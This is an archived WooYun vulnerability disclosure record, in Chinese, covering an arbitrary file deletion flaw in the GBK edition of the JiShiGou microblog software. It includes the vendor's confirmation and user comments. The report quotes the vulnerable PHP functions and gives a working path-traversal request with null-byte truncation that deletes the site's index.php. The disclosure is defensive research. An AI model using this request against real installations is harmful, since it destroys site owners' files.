{"id": 5918, "wybug_id": "wooyun-2013-043705", "wybug_title": "记事狗GBK版本任意文件删除漏洞", "wybug_corp": "杭州神话", "wybug_author": "Chora", "wybug_date": "2013-11-22 15:28", "wybug_open_date": "2014-02-20 15:28", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-25：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-20：\t细节向公众公开  简要描述： 想了下还是提交算了，留着也没用。好久没搞黑盒了，恢复恢复求带啊。 详细说明：  问题出在一个自定义函数上，官方好像出了4.5版本没去看是否也是用的这个函数，4.0大概找了下没找到可用包含的，要是4.5也有这个函数，新版本应该有包含漏洞，我就不去深究了，主要是指出问题，修正。include/function/global.func.php\nif(!function_exists('jaddslashes')) {\tfunction jaddslashes($string) {\t\tif(is_array($string)) {\t\t\t$keys = array_keys($string);\t\t\tforeach($keys as $key) {\t\t\t\t$val = $string[$key];\t\t\t\tunset($string[$key]);\t\t\t\t$string[jjaddslashes($key)] = jaddslashes($val);\t\t\t}\t\t} else {\t\t\t$string = jjaddslashes($string);\t\t}\t\treturn $string;\t}}function jjaddslashes($str) {\t\t\tif(MAGIC_QUOTES_GPC) $str = stripslashes($str);//去掉转义\t\tif('gbk'==$GLOBALS['_J']['charset']) {\t\t$str = gbk_addslashes($str);//为GBK编码的时候，使用自定义的GBK函数。\t} else {\t\t$str = addslashes($str);\t}\treturn $str;}function gbk_addslashes($text) {\tfor ( ; ; ) {\t\t$i = mb_strpos($text, chr(92), 0, \"GBK\");\t\tif ($i === false) break;\t\t$T = mb_substr($text, 0, $i, \"GBK\") . chr(92) . chr(92);//将\\添加一个\\即\\\\，模仿GPC功能\t\t$text = substr($text, strlen($T) - 1);\t\t$OK .= $T;\t}\t$text = $OK . $text;\t$text = str_replace(chr(39), chr(92) . chr(39), $text);//将'转义成\\'\t$text = str_replace(chr(34), chr(92) . chr(34), $text);//将\"转义成\\\"\treturn $text;}\n但是上面的代码忘了GPC的另外一个重要功能，那就是%00的截断会被转义成\\0,而上面并没有定义这个功能，所以导致了可截断。modules/ajax/misc.mod.php\nfunction refalshStatic(){        $type = jget('type'); //可控        $cache_id = 'misc/'.$type.'_statistics';        cache_file('rm',$cache_id); //跟进0x01        if($type == 'other'){            cache_file('rm','misc/data_length');        }        $func = 'get'.  ucfirst($type).'Statistics';        $ret = jlogic('other')->$func();        #生成html代码        $head_html = \"<tr class='altbg1'>\";        $body_html = \"<tr class='altbg2'>\";        if($ret){            foreach ($ret['data'] as $k => $v) {                $head_html .= \"<td>{$v['name']}</td>\";                $body_html .= \"<td>{$v['num']}</td>\";            }        }        $head_html .= \"</tr>\";        $body_html .= \"</tr>\";        echo $head_html.$body_html;    }\ninclude/function/global.func.php 0x01\nfunction cache_file($cmd, $key='', $val='', $life=0) {\treturn jcache($cmd, $key, $val, $life, 'file');}function jcache($cmd, $key='', $val='', $life=0, $type='file') {\t$cmds = array('get'=>1, 'mget'=>1, 'set'=>1, 'mset'=>1, 'rm'=>1, 'mrm'=>1, 'del'=>1, 'clear'=>1, 'clean'=>1);\tif(isset($cmds[$cmd])) {\t\t$type = ('db' == $type ? 'db' : 'file');\t\tswitch ($cmd) {\t\t\tcase 'get': return jmodel('cache/' . $type)->get($key); break;\t\t\tcase 'mget': return jmodel('cache/' . $type)->get($key, 1); break;\t\t\tcase 'set': return jmodel('cache/' . $type)->set($key, $val, $life); break;\t\t\tcase 'mset': return jmodel('cache/' . $type)->set($key, $val, $life, 1); break;\t\t\tcase 'rm' : case 'del': return jmodel('cache/' . $type)->rm($key, $val); break; //跟进0x02\t\t\tcase 'mrm' : return jmodel('cache/' . $type)->rm($key, $val, 1); break;\t\t\tcase 'clear': case 'clean': return jmodel('cache/' . $type)->clear(); break;\t\t}\t}\treturn null;}\ninclude/class/cache/file.class.php\nfunction rm($key, $more=0) {\t\treturn $this->del($key, $more);\t}\tfunction del($key, $more=0) {\t\tif($this->memory) {\t\t\t$this->memory->del($key, $this->prefix);\t\t} else {\t\t\tif($more && is_dir(($dir = $this->path . $key))) {\t\t\t\t$ret = $this->io->ClearDir($dir);\t\t\t} else {\t\t\t\t$ret = $this->io->DeleteFile($this->_file($key)); //删除文件\t\t\t}\t\t}\t\t\t\treturn $ret;\t}\tfunction _file($key) {\t\treturn $this->path . $key . '.cache.php'; //因为后缀要加上.cache.php，所以只能删除缓存文件，但是我们截断的话就可以删除任意文件。\t}\n注册一个用户,提交localhost/jishigou/ajax.php?mod=misc&code=refalshstatic&type=../../../../index.php%00删除主页。会出现致命错误页面，因为在触发删除函数后，后面调用了OtherLogic类的方法，方法名是有type参数提供的，        $func = 'get'.  ucfirst($type).'Statistics';        $ret = jlogic('other')->$func();虽然可以截断函数调用这个类的其他函数，但是这个类里面没找到利用的。虽然是致命错误但是前面的删除已经触发了，所以无影响。   漏洞证明：  \n\n\n\n   修复方案：  不包养了。   版权声明：转载请注明来源 Chora@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-11-22 16:41 厂商回复： 非常感谢 Chora@乌云 的反馈，正在抓紧修理。。。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-22 16:30 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  keep 够淫荡！    \n     2013-11-27 07:55 |    \t\tQQ852451559 \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:18        | 学生党)\t\t \n  going down !    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}